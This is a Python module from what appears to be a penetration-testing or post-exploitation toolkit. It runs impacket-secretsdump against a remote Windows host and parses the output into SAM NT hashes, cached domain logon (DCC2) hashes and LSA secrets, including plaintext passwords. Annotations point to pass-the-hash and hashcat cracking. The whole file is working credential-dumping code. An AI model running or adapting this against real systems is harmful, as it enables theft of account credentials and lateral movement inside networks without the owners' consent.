"""SAM / LSA secrets / cached domain logons (DCC2) via impacket-secretsdump."""
from __future__ import annotations

import re
from typing import List

from core.credential import Credential
from core.secret import Secret, Status
from core.tools import find_tool, run
from .base import BaseCollector

SAM_RE = re.compile(r"^([^:]+):(\d+):([0-9a-fA-F]{32}):([0-9a-fA-F]{32}):::")
DCC2_RE = re.compile(r"^(.+?):(\$DCC2\$\d+#[^#]+#[0-9a-fA-F]+)")


class SamLsaCollector(BaseCollector):
    name = "SAM/LSA"
    description = "SAM hashes, LSA secrets, cached domain logons (needs admin)"
    per_credential = False
    requires = ("secretsdump",)

    def collect_once(self, cred: Credential) -> List[Secret]:
        bin_ = find_tool("secretsdump")
        if not bin_:
            return []
        cmd = [bin_, cred.secretsdump_target(self.host)] + cred.impacket_extra_args()
        res = run(cmd, timeout=self.timeout, raw_dir=self.raw_dir,
                  raw_name=self._raw_name(cred))
        return self._parse(res.output)

    def _parse(self, out: str) -> List[Secret]:
        found: List[Secret] = []
        section = ""
        for line in out.splitlines():
            line = line.rstrip()
            low = line.lower()
            if "dumping local sam" in low:
                section = "sam"; continue
            if "dumping cached domain" in low:
                section = "dcc2"; continue
            if "dumping lsa secrets" in low:
                section = "lsa"; continue

            m = SAM_RE.match(line)
            if m:
                user, _rid, _lm, nt = m.groups()
                found.append(Secret(self.host, "SAM", user, nt, Status.HASH,
                                    secret_type="nthash",
                                    notes="local account; PtH or hashcat -m 1000"))
                continue

            m = DCC2_RE.match(line)
            if m:
                user, h = m.groups()
                found.append(Secret(self.host, "DCC2", user, h, Status.HASH,
                                    secret_type="dcc2",
                                    notes="cached domain logon; crack only, hashcat -m 2100"))
                continue

            if section == "lsa":
                if ":plain_password_hex:" in line or "plain_password" in low:
                    name = line.split(":", 1)[0]
                    found.append(Secret(self.host, "LSA", name,
                                        "(plaintext in raw output)", Status.CLEARTEXT,
                                        secret_type="password",
                                        notes="LSA secret plaintext - see raw file"))
                elif re.match(r"^\S+/\S+:.+", line) and "$" not in line.split(":")[0]:
                    name, val = line.split(":", 1)
                    if val and len(val) < 200:
                        found.append(Secret(self.host, "LSA", name, val,
                                            Status.CLEARTEXT, secret_type="password"))
        return found
